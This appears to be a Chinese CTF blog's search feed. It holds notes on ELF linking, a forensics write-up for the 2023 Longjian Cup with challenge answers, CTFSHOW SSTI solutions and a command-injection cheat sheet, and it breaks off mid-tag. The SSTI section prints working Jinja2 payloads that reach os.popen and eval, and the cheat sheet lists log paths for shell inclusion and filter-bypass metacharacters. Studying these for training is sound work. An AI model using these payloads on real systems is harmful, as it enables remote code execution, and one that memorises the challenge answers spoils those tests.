<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>elf-file</title>
      <link href="/posts/6eec.html"/>
      <url>/posts/6eec.html</url>
      
        <content type="html"><![CDATA[<h1 id="ELF文件"><a href="#ELF文件" class="headerlink" title="ELF文件"></a>ELF文件</h1><h2 id="从源码到可执行文件"><a href="#从源码到可执行文件" class="headerlink" title="从源码到可执行文件"></a>从源码到可执行文件</h2><p>预处理 -&gt;  编译 -&gt;  汇编 -&gt;  链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -E filename.c &gt; filename.i   ; preprocessed source</span><br><span class="line">gcc -S filename.i &gt; filename.s   ; assembly code</span><br><span class="line">gcc -c filename.s &gt; filename.o   ; object file</span><br><span class="line">gcc    filename.o &gt; filename.out ; binary executable</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/27/GxJgekF2yHl9PQZ.png" alt="image-20230827232641398"></p><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><h4 id="静态链接-（编译后完成）"><a href="#静态链接-（编译后完成）" class="headerlink" title="静态链接 （编译后完成）"></a>静态链接 （编译后完成）</h4><p>可移植性强，文件大</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc file.c -static -o bin</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/27/MGlfZavV3mpwRNh.png" alt="image-20230827232301660"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gef➤  vmmap </span><br><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x00000000400000 0x00000000401000 0x00000000000000 r-- /usr/ctf/pwn/tests/bin_static</span><br><span class="line">0x00000000401000 0x00000000479000 0x00000000001000 r-x /usr/ctf/pwn/tests/bin_static</span><br><span class="line">0x00000000479000 0x000000004a0000 0x00000000079000 r-- /usr/ctf/pwn/tests/bin_static</span><br><span class="line">0x000000004a0000 0x000000004a4000 0x000000000a0000 r-- /usr/ctf/pwn/tests/bin_static</span><br><span class="line">0x000000004a4000 0x000000004a7000 0x000000000a4000 rw- /usr/ctf/pwn/tests/bin_static</span><br><span class="line">0x000000004a7000 0x000000004ce000 0x00000000000000 rw- [heap]</span><br><span class="line">0x007ffff7ff9000 0x007ffff7ffd000 0x00000000000000 r-- [vvar]</span><br><span class="line">0x007ffff7ffd000 0x007ffff7fff000 0x00000000000000 r-x [vdso]</span><br><span class="line">0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]</span><br></pre></td></tr></table></figure><h4 id="动态链接-（程序加载后完成）"><a href="#动态链接-（程序加载后完成）" class="headerlink" title="动态链接 （程序加载后完成）"></a>动态链接 （程序加载后完成）</h4><p>可移植性差，文件小</p><p><img src="https://s2.loli.net/2023/08/27/NXKcJuv5g6SbFzW.png" alt="0x3"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">gef➤  vmmap </span><br><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x00555555554000 0x00555555555000 0x00000000000000 r-- /usr/ctf/pwn/tests/a.out</span><br><span class="line">0x00555555555000 0x00555555556000 0x00000000001000 r-x /usr/ctf/pwn/tests/a.out</span><br><span class="line">0x00555555556000 0x00555555557000 0x00000000002000 r-- /usr/ctf/pwn/tests/a.out</span><br><span class="line">0x00555555557000 0x00555555558000 0x00000000002000 r-- /usr/ctf/pwn/tests/a.out</span><br><span class="line">0x00555555558000 0x00555555559000 0x00000000003000 rw- /usr/ctf/pwn/tests/a.out</span><br><span class="line">0x007ffff7dc3000 0x007ffff7dc6000 0x00000000000000 rw- </span><br><span class="line">0x007ffff7dc6000 0x007ffff7dec000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x007ffff7dec000 0x007ffff7f41000 0x00000000026000 r-x /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x007ffff7f41000 0x007ffff7f94000 0x0000000017b000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x007ffff7f94000 0x007ffff7f98000 0x000000001ce000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x007ffff7f98000 0x007ffff7f9a000 0x000000001d2000 rw- /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x007ffff7f9a000 0x007ffff7fa7000 0x00000000000000 rw- </span><br><span class="line">0x007ffff7fc3000 0x007ffff7fc5000 0x00000000000000 rw- </span><br><span class="line">0x007ffff7fc5000 0x007ffff7fc9000 0x00000000000000 r-- [vvar]</span><br><span class="line">0x007ffff7fc9000 0x007ffff7fcb000 0x00000000000000 r-x [vdso]</span><br><span class="line">0x007ffff7fcb000 0x007ffff7fcc000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">0x007ffff7fcc000 0x007ffff7ff1000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">0x007ffff7ff1000 0x007ffff7ffb000 0x00000000026000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">0x007ffff7ffb000 0x007ffff7ffd000 0x00000000030000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">0x007ffff7ffd000 0x007ffff7fff000 0x00000000032000 rw- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]</span><br></pre></td></tr></table></figure><h2 id="重要节信息"><a href="#重要节信息" class="headerlink" title="重要节信息"></a>重要节信息</h2><div class="table-container"><table><thead><tr><th style="text-align:center">Section</th><th style="text-align:center">说明</th><th style="text-align:center">权限</th></tr></thead><tbody><tr><td style="text-align:center">.init</td><td style="text-align:center">初始化代码，先于main执行</td><td style="text-align:center">R_X</td></tr><tr><td style="text-align:center">.fini</td><td style="text-align:center">结束代码，在最后执行</td><td style="text-align:center">R_X</td></tr><tr><td style="text-align:center">.text</td><td style="text-align:center">程序汇编指令</td><td style="text-align:center">R_X</td></tr><tr><td style="text-align:center">.rodata</td><td style="text-align:center">存放只读数据，一般是字符串常量（代码中直接使用的字符串也算）</td><td style="text-align:center">R__</td></tr><tr><td style="text-align:center">.data</td><td style="text-align:center">保存已经初始化（非零初始化）的全局变量和静态局部变量</td><td style="text-align:center">RW_</td></tr><tr><td style="text-align:center">.bss</td><td style="text-align:center">未初始化（零初始化）的全局变量和静态局部变量保存在bss段</td><td style="text-align:center">RW_</td></tr><tr><td style="text-align:center">.got</td><td style="text-align:center">Global Offset Table  存放外部符号的实际偏移</td><td style="text-align:center">RW_</td></tr><tr><td style="text-align:center">.got.plt</td><td style="text-align:center">和.plt共同发挥作用，存放.plt所需的偏移量</td><td style="text-align:center">RW_ \</td><td>R__ (full-RELRO)</td></tr><tr><td style="text-align:center">.plt</td><td style="text-align:center">Procedure Linkage Table程序链接表   作为跳板调用外部函数  要么在<code>.got.plt</code>节中拿到地址，并跳转。要么当<code>.got.plt</code>没有所需地址的时候，触发链接器去找到所需的地址</td><td style="text-align:center">R_X</td></tr><tr><td style="text-align:center">.plt.got</td><td style="text-align:center">仅当开启full-RELRO时出现</td><td style="text-align:center">R_X</td></tr><tr><td style="text-align:center">.dynamic</td><td style="text-align:center">存储动态链接器的加载</td></tr></tbody></table></div><p><img src="https://s2.loli.net/2023/08/27/mQS3Ga57iKkUbCz.png" alt="image-20230827232449734"><br><img src="https://s2.loli.net/2023/08/27/qy8sxw5FQHpjOCb.png" alt="image-20230827232508378"></p><h3 id="调用外部函数时plt和got行为"><a href="#调用外部函数时plt和got行为" class="headerlink" title="调用外部函数时plt和got行为"></a>调用外部函数时plt和got行为</h3><p>调用外部函数，首先都跳转至对应PLT区，再跳转至对应GOT区</p><ul><li><p>若为首次调用该函数</p><p><img src="https://s2.loli.net/2023/08/27/rSqp2xoefcFDmQt.png" alt="0x6"></p><ol><li>依次跳转到 printf@plt 和 printf@got</li><li>由got跳转至 printf@plt+6   </li><li>跳转至_plt</li><li>再跳转到 resolve 函数获取 printf 函数的绝对地址，将地址存入got表（准确来说是.got.plt）并执行printf</li></ol></li><li><p>非首次调用</p><p>call func -&gt; func@plt -&gt; func@got -&gt; 真实地址</p></li></ul><blockquote><p>参考</p><p><a href="https://hackthedeveloper.com/c-program-compilation-process/">https://hackthedeveloper.com/c-program-compilation-process/</a></p><p><a href="https://www.matteomalvica.com/minutes/binary_analysis/">https://www.matteomalvica.com/minutes/binary_analysis/</a></p><p><a href="https://intezer.com/blog/research/executable-linkable-format-101-part1-sections-segments/">https://intezer.com/blog/research/executable-linkable-format-101-part1-sections-segments/</a></p><p><a href="https://intezer.com/blog/malware-analysis/executable-linkable-format-101-part-4-dynamic-linking/">https://intezer.com/blog/malware-analysis/executable-linkable-format-101-part-4-dynamic-linking/</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 第二届陇剑杯-Writeup</title>
      <link href="/posts/15a8.html"/>
      <url>/posts/15a8.html</url>
      
        <content type="html"><![CDATA[<h1 id="HW"><a href="#HW" class="headerlink" title="HW"></a>HW</h1><h2 id="hard-web-1"><a href="#hard-web-1" class="headerlink" title="hard_web_1"></a>hard_web_1</h2><p>过滤器:ip.dst == 192.168.162.188 and tcp.connection.synack</p><p>一个一个看，能看到 <code>80, 888, 8888</code></p><h2 id="hard-web-2"><a href="#hard-web-2" class="headerlink" title="hard_web_2"></a>hard_web_2</h2><p>先执行第一次脚本，在返回包24208得到了key为xc</p><h1 id="SS"><a href="#SS" class="headerlink" title="SS"></a>SS</h1><h2 id="sevrer-save-1"><a href="#sevrer-save-1" class="headerlink" title="sevrer save_1"></a>sevrer save_1</h2><p><img src="https://s2.loli.net/2023/08/26/cr2NQtLCXeTophH.png" alt="image-20230826105433338"></p><p>发现playload，去搜一下发现是spring Framework RCE(CVE-2022-22965)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2022-22965</span><br></pre></td></tr></table></figure><h2 id="sevrer-save-2"><a href="#sevrer-save-2" class="headerlink" title="sevrer save_2"></a>sevrer save_2</h2><p><img src="https://s2.loli.net/2023/08/26/tziXH652abDxAOC.png" alt="image-20230826105731570"></p><p>流量包内发现反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.43.128:2333</span><br></pre></td></tr></table></figure><h2 id="sevrer-save-3"><a href="#sevrer-save-3" class="headerlink" title="sevrer save_3"></a>sevrer save_3</h2><p><img src="https://s2.loli.net/2023/08/27/WXY8w6E2hyqjsti.png" alt="image-20230827153939218"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main</span><br></pre></td></tr></table></figure><h2 id="sevrer-save-4"><a href="#sevrer-save-4" class="headerlink" title="sevrer save_4"></a>sevrer save_4</h2><p><img src="https://s2.loli.net/2023/08/27/eLxmj967OadWuUz.png" alt="image-20230827154111314"></p><p>在/etc/shadow内发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ll:123456</span><br></pre></td></tr></table></figure><h2 id="sevrer-save-5"><a href="#sevrer-save-5" class="headerlink" title="sevrer save_5"></a>sevrer save_5</h2><p><img src="https://s2.loli.net/2023/08/27/kSKE9gh4GBCAtFM.png" alt="image-20230827154256267"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.105.202.239</span><br></pre></td></tr></table></figure><h2 id="sevrer-save-6"><a href="#sevrer-save-6" class="headerlink" title="sevrer save_6"></a>sevrer save_6</h2><p><img src="https://s2.loli.net/2023/08/27/G36EPXyLDBgmvJC.png" alt="image-20230827154326045"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lolMiner,mine_doge.sh</span><br></pre></td></tr></table></figure><h2 id="sevrer-save-7"><a href="#sevrer-save-7" class="headerlink" title="sevrer save_7"></a>sevrer save_7</h2><p>在guest目录下发现POOL地址</p><p><img src="https://s2.loli.net/2023/08/26/2ZBdPSbOaezWXDl.png" alt="image-20230826112125666"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">doge.millpools.cc:5567</span><br></pre></td></tr></table></figure><h2 id="sevrer-save-8"><a href="#sevrer-save-8" class="headerlink" title="sevrer save_8"></a>sevrer save_8</h2><p>上图也发现了WALLET地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOGE:DRXz1q6ys8Ao2KnPbtb7jQhPjDSqtwmNN9</span><br></pre></td></tr></table></figure><h1 id="WS"><a href="#WS" class="headerlink" title="WS"></a>WS</h1><h2 id="Wireshark1-1"><a href="#Wireshark1-1" class="headerlink" title="Wireshark1_1"></a>Wireshark1_1</h2><p><img src="https://s2.loli.net/2023/08/26/qClXIASsu5B1op6.png" alt="image-20230826103759891"></p><p>destination为192.168.246.28</p><h2 id="Wireshark1-2"><a href="#Wireshark1-2" class="headerlink" title="Wireshark1_2"></a>Wireshark1_2</h2><p><img src="https://s2.loli.net/2023/08/26/3Nf4ix6qPFsAkmQ.png" alt="image-20230826103955137"></p><p>追踪tcp流发现密码口令youcannevergetthis</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">youcannevergetthis</span><br></pre></td></tr></table></figure><h2 id="Wireshark1-3"><a href="#Wireshark1-3" class="headerlink" title="Wireshark1_3"></a>Wireshark1_3</h2><p><img src="https://s2.loli.net/2023/08/26/Z8IvXbdFesMS3pE.png" alt="image-20230826104244247"></p><p>ls目录看到第二个文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Downloads</span><br></pre></td></tr></table></figure><h2 id="Wireshark1-4"><a href="#Wireshark1-4" class="headerlink" title="Wireshark1_4"></a>Wireshark1_4</h2><p><img src="https://s2.loli.net/2023/08/26/VQFxtYONZL6peRH.png" alt="image-20230826104618028"></p><p>明文mysql</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br></pre></td></tr></table></figure><h1 id="SSW"><a href="#SSW" class="headerlink" title="SSW"></a>SSW</h1><h2 id="SmallSword-1"><a href="#SmallSword-1" class="headerlink" title="SmallSword_1"></a>SmallSword_1</h2><p><img src="https://s2.loli.net/2023/08/26/FDrfue9VnIPY46y.png" alt="image-20230826155402330"></p><p>了解一下蚁剑流量特点，直接得到webshell的密码。</p><h2 id="SmallSword-2"><a href="#SmallSword-2" class="headerlink" title="SmallSword_2"></a>SmallSword_2</h2><p>分析流量发现向hacker.txt内写入了数据，base64解码得到数据ad6269b7-3ce2-4ae8-b97f-f259515e7a91</p><p><img src="https://s2.loli.net/2023/08/26/wWuozNAVKPl172j.png" alt="image-20230826161228875"></p><h2 id="SmallSword-3"><a href="#SmallSword-3" class="headerlink" title="SmallSword_3"></a>SmallSword_3</h2><p>把http对象全部导出来，发现一个奇怪的php文件5MB。打不开，010发现其为exe文件。</p><p><img src="https://s2.loli.net/2023/08/27/2tbSZ8QnUJXEKai.png" alt="image-20230827162026709"></p><p>删掉 <code>2D 3E 7C</code> ，后缀名改为 <code>exe</code></p><p><img src="https://s2.loli.net/2023/08/27/r3ZiWRjSqAkbnmQ.png" alt="image-20230827162356121"></p><p>上一层看到了一张test.jpg</p><p><img src="https://s2.loli.net/2023/08/27/2cNbU65tSzqBloA.png" alt="image-20230827162522788"></p><p>发现其为png图片。</p><p><img src="https://s2.loli.net/2023/08/27/GtkTjSc8pOeJAh5.png" alt="image-20230827162601470"></p><p>改后缀拉入010，可以看到CRC错误。</p><p><img src="https://s2.loli.net/2023/08/27/28npNQaJkXKCfhu.png" alt="image-20230827162747922"></p><p>CRC脚本爆破其原本宽高。</p><p><img src="https://s2.loli.net/2023/08/27/bvzyp1RTG6rAx7m.png" alt="image-20230827165554185"></p><p><img src="https://s2.loli.net/2023/08/27/hLoGFWOnYtjw8pe.png" alt="image-20230827165612241"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag3&#123;8f0dffac-5801-44a9-bd49-e66192ce4f57&#125;</span><br></pre></td></tr></table></figure><h1 id="EW"><a href="#EW" class="headerlink" title="EW"></a>EW</h1><h2 id="ez-web-1"><a href="#ez-web-1" class="headerlink" title="ez_web_1"></a>ez_web_1</h2><p><img src="https://s2.loli.net/2023/08/27/lky5uDt2pW16Las.png" alt="image-20230827155101475"></p><p>自带的是 <code>ViewMore.php</code>，这个php正在上传 <code>d00r.php</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ViewMore.php</span><br></pre></td></tr></table></figure><h2 id="ez-web-2"><a href="#ez-web-2" class="headerlink" title="ez_web_2"></a>ez_web_2</h2><p>发现流量包内有ifconfig查询本机ip，返回包发现内网ip。</p><p><img src="https://s2.loli.net/2023/08/26/tRN4c3EJIhBXevM.png" alt="image-20230826165609533"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.101.132</span><br></pre></td></tr></table></figure><h2 id="ez-web-3"><a href="#ez-web-3" class="headerlink" title="ez_web_3"></a>ez_web_3</h2><p>发现file_put_content了一个key文件</p><p><img src="https://s2.loli.net/2023/08/26/uWTyJcHZYXMpkN6.png" alt="image-20230826170313412"></p><p>base64解码发现其是zip压缩包，010导出对应压缩包发现需要密码。</p><p><img src="https://s2.loli.net/2023/08/26/YLQXKgAdE2CDyto.png" alt="image-20230826170917639"></p><p>在流量包内有cat /passwd，是其解压密码。</p><p><img src="https://s2.loli.net/2023/08/26/4KdOG189jWsiwU5.png" alt="image-20230826171502386"></p><p>得到key</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7d9ddff2-2d67-4eba-9e48-b91c26c42337</span><br></pre></td></tr></table></figure><h1 id="BF"><a href="#BF" class="headerlink" title="BF"></a>BF</h1><h2 id="baby-forensics-1"><a href="#baby-forensics-1" class="headerlink" title="baby_forensics_1"></a>baby_forensics_1</h2><p>rot47编码。解码即可2e80307085fd2b5c49c968c323ee25d5。</p><h2 id="baby-forensics-2"><a href="#baby-forensics-2" class="headerlink" title="baby_forensics_2"></a>baby_forensics_2</h2><h2 id="baby-forensics-3"><a href="#baby-forensics-3" class="headerlink" title="baby_forensics_3"></a>baby_forensics_3</h2><h1 id="HD"><a href="#HD" class="headerlink" title="HD"></a>HD</h1><h2 id="hacked-1"><a href="#hacked-1" class="headerlink" title="hacked_1"></a>hacked_1</h2><p>username和password经过aes加密，key和iv在js内已知，cbc模式。登录流量包解密就能拿到密码flag{WelC0m5_TO_H3re}</p><p><img src="https://s2.loli.net/2023/08/26/giprX9ATGqhF7U8.png" alt="image-20230826173954478"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;WelC0m5_TO_H3re&#125;</span><br></pre></td></tr></table></figure><h2 id="hacked-2"><a href="#hacked-2" class="headerlink" title="hacked_2"></a>hacked_2</h2><p>直接搜secret，发现流量包，全是html实体，解码得到SECRET_KEY。</p><p><img src="https://s2.loli.net/2023/08/27/5bVMTZCrRxhfOiq.png" alt="image-20230827160044644"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssti_flask_hsfvaldb</span><br></pre></td></tr></table></figure><h2 id="hacked-3"><a href="#hacked-3" class="headerlink" title="hacked_3"></a>hacked_3</h2><p><img src="https://s2.loli.net/2023/08/27/cR4VtwC3kNDeoIO.png" alt="image-20230827160710510"></p><p>tcp流76，解码</p><h2 id="hacked-4"><a href="#hacked-4" class="headerlink" title="hacked_4"></a>hacked_4</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW-SSTI</title>
      <link href="/posts/9e9b.html"/>
      <url>/posts/9e9b.html</url>
      
        <content type="html"><![CDATA[<h1 id="CTFSHOW-SSTI"><a href="#CTFSHOW-SSTI" class="headerlink" title="CTFSHOW-SSTI"></a>CTFSHOW-SSTI</h1><p>对ssti一直是粗略的了解，这里做点题巩固一下。</p><blockquote><p>简单来说，SSTI 的最终目的是能够逃逸出 Jinja2的沙盒，然后执行任意的python代码。如果能够获取到 builitins 也就能得到了 python 的内建对象，也就可以调用 python 的任意内建函数了</p></blockquote><p>在此之前可以看一下：<a href="https://xz.aliyun.com/t/3679">flask之ssti模版注入从零到入门</a></p><h2 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h2><p>名字就是考点，应该是让我们传入一个name的参数，这里我们可以尝试一下ssti，发现确实存在ssti漏洞，回显为2。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0f42720e-9b61-4c31-b56a-6b0250d8aafe.challenge.ctf.show/?name=&#123;&#123;<span class="number">1</span>*<span class="number">2</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>tplmap一把梭即可，jinja的ssti。<a href="https://github.com/epinna/tplmap">tplmap</a>.</p><p>无任何过滤。    </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&quot;cat /flag&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>上题的方法用不了了，<code>&#123;&#123;''.__class__.__mro__[1].__subclasses__()[132]&#125;&#125;</code>，过滤了os._wrap_close</p><p>可以用<code>&#123;%%&#125;</code>来进行遍历和条件判断，让它指向os._wrap_close</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> i.__name__==<span class="string">&#x27;_wrap_close&#x27;</span> %&#125;</span><br><span class="line">        &#123;% <span class="built_in">print</span> i.__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>).read() %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>或者是利用已有函数找到<strong>builtins</strong>，然后直接直接从 <strong>builtins</strong> 的内置对象中取内置的 eval 函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当然还有很多rce的方法，self、request等等都可以。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>杂七杂八</title>
      <link href="/posts/1e48.html"/>
      <url>/posts/1e48.html</url>
      
        <content type="html"><![CDATA[<h1 id="杂七杂八"><a href="#杂七杂八" class="headerlink" title="杂七杂八"></a>杂七杂八</h1><h2 id="配置文件位置"><a href="#配置文件位置" class="headerlink" title="配置文件位置"></a>配置文件位置</h2><p>常用于查看路由转发，可能把flag藏到哪个路径</p><p>nginx</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/nginx/conf/nginx.conf</span><br><span class="line">/etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure><p>apache</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/httpd/conf/httpd.conf</span><br></pre></td></tr></table></figure><h2 id="日志文件位置"><a href="#日志文件位置" class="headerlink" title="日志文件位置"></a>日志文件位置</h2><p>可以用于日志包含拿shell</p><p>nginx</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>apache</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/log/apache/access.log</span><br><span class="line">/var/log/apache2/access.log</span><br><span class="line">/var/log/httpd/access.log</span><br></pre></td></tr></table></figure><p>iis日志文件：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%systemroot%\system32\logfiles\</span><br></pre></td></tr></table></figure><h2 id="查看文件内容"><a href="#查看文件内容" class="headerlink" title="查看文件内容"></a>查看文件内容</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Linux：cat、tac、more、less、head、tail、nl、sed、sort、uniq、rev</span><br><span class="line"></span><br><span class="line">PHP：file_get_content()、show_source()、include()、highlight_file()</span><br><span class="line">假如在执行命令时冒号:和括号被禁</span><br><span class="line">就需要使用一些无需括号的php语言结构，如：echo、print、isset、unset、include、require</span><br></pre></td></tr></table></figure><h1 id="Linux下的一些特性"><a href="#Linux下的一些特性" class="headerlink" title="Linux下的一些特性"></a>Linux下的一些特性</h1><h2 id="一些符号"><a href="#一些符号" class="headerlink" title="一些符号"></a>一些符号</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*           # 通配符,匹配任意字符</span><br><span class="line">?           # 占位符,匹配任意一个字符 </span><br><span class="line">作用类似正则 (可绕过文件名过滤，如：tac *、?at flag.php）</span><br><span class="line">%0a(换行符)</span><br><span class="line">$           # 变量调用符号</span><br><span class="line">|           # 第一条命令结果作为第二条命令的输入</span><br><span class="line">||          # 第一条执行失败，执行第二条命令</span><br><span class="line">;           # 连续指令功能。</span><br><span class="line">&amp;           # 连接的两条命令都会执行</span><br><span class="line">&amp;&amp;          # 当第一条执行成功后执行后续命令</span><br><span class="line">&gt;           # 重定向输出符号（覆盖）</span><br><span class="line">&gt;&gt;          # 重定向输出符号（追加）</span><br></pre></td></tr></table></figure><h3 id="Linux下的引号"><a href="#Linux下的引号" class="headerlink" 